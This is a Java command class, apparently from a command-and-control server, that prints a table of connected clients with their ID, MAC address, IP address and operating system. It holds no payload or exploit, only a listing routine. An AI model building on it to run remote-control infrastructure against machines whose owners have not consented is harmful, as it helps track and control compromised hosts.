package commands;

import server.CommandServer;
import tools.ParsedCommand;

/**
 * List all detected clients
 * 
 * @author Yohan Chalier
 *
 */
public class ListCmd extends ServerCommand {

	public ListCmd(CommandServer c2) {
		super(c2);
	}

	@Override
	public String exec(ParsedCommand pCmd) {
		StringBuilder sb = new StringBuilder();
		sb.append("id  \tMAC address      \tIP address    \tOS\n");
		
		for (int id: c2.getClients().keySet()) {
			sb.append(id + "\t"
					+ c2.getClients().get(id).getMACAddress() + "\t"
					+ c2.getClients().get(id).getInetAddress() + "\t"
					+ c2.getClients().get(id).getOs() + "\n");
		}
		
		// Removing last '\n'
		sb.setCharAt(sb.length() - 1, (char) 0);
		
		return sb.toString();
	}

}
